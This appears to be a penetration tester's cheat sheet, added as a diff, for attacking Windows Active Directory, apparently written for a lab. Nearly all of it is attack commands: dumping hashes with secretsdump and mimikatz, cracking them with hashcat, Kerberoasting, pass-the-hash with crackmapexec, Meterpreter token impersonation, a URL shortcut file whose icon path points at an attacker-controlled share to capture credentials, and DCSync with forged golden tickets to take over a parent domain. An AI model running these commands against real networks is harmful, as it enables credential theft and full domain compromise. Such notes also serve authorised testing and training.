@@ -1,0 +1,147 @@
+Catching Hashes 
+
+Command: secretsdump.py [domain]/[username]:[password]@[IP] 
+
+Command: hashcat64.exe -m 1000 [hash] 
+
+ 
+
+Golden Tickets 
+
+Commands via mimikatz: 
+
+lsadump::lsa /inject /name:krbtgt 
+
+You need SID of domain, NTLM Hash 
+
+kerberos::golden /User:Administrato (or whatever you want) /domain:[DOMAIN] /sid:[SID] /krbtgt [NTLM HASH] /id:500 /ptt 
+
+misc::command (Opens CMD with golden ticket) 
+
+ 
+
+`Kuberoasting 
+
+Command:  
+
+python GetUserSPNs.py <DOMAIN/Username:password> -dc-ip <Domain Controller IP> -request 
+
+hashcat -m 13100 kerberoast.txt rockyou.txt 
+
+ 
+
+Other Mimikatz 
+
+ 
+
+sekurlsa::logonpasswords 
+
+(Must have mimikatz on it 
+
+lsadump:sam 
+
+lsadump:lsa /patch 
+
+ 
+
+Pass the Hash 
+
+crackmapexec [IP-Range]/24 -u [Username] -h [SAM HASH] --local 
+
+You can use psexec 
+
+crackmapexec smb [IP]/24 -u [Username] -H [hash] --local-auth  
+
+ 
+
+Pass the Password 
+
+ 
+
+Command: 
+
+crackmapexec [IP]/24 -u [username] -d [domain] -p [password] 
+
+ 
+
+you can use psexec 
+
+ 
+
+Token Impersonation 
+
+Commands: 
+
+Meterpreter > impersonate_token [domain]\\[username] > shell 
+
+Get into machine 
+
+load incognito 
+
+list_tokens -u 
+
+ 
+
+URL File Attack 
+
+File: 
+
+[Internet Shortcut] 
+
+URL=blah 
+
+WorkingDirectory=blah 
+
+IconFile=\\[AttackerIP]\%USERNAME%.icon 
+
+InconIndex=1 
+
+ 
+
+ 
+
+IF SUB DOMAIN CONTROLLER (eg: root=thereserve.loc, child=red.thereserve.loc) 
+
+Get-ADTrust -Filter * 
+
+ 
+
+First of, getting a SID of a krbtgt user account in offense.local: 
+
+(Empire: powershell/situational_awareness/network/powerview/get_domain_trust) > usemodule powershell/management/user_to_sid 
+
+(Empire: powershell/management/user_to_sid) > set Domain offense.local 
+
+(Empire: powershell/management/user_to_sid) > set User krbtgt 
+
+(Empire: powershell/management/user_to_sid) > run 
+
+ 
+
+After getting a SID of the offense.local\krbtgt, we need to get a password hash of the krbtgt account in the compromised DC DC-RED (we can extract it since we are a domain admin in red.offense.local): 
+
+(Empire: powershell/management/user_to_sid) > usemodule powershell/credentials/mimikatz/dcsync 
+
+(Empire: powershell/credentials/mimikatz/dcsync) > set user red\krbtgt 
+
+(Empire: powershell/credentials/mimikatz/dcsync) > execute 
+
+ 
+
+Golden Ticket for Root Domain 
+
+We can now generate a golden ticket for offense.local\Domain Adminssince we have the SID of the offense.local\krbtgt and the hash of red.offense.local\krbtgt: 
+
+usemodule powershell/credentials/mimikatz/golden_ticket 
+
+(Empire: powershell/credentials/mimikatz/golden_ticket) > set user hakhak 
+
+(Empire: powershell/credentials/mimikatz/golden_ticket) > set sids S-1-5-21-4172452648-1021989953-2368502130-519 
+
+(Empire: powershell/credentials/mimikatz/golden_ticket) > set CredID 8 
+
+(Empire: powershell/credentials/mimikatz/golden_ticket) > run 
+
+ 
+
+ 
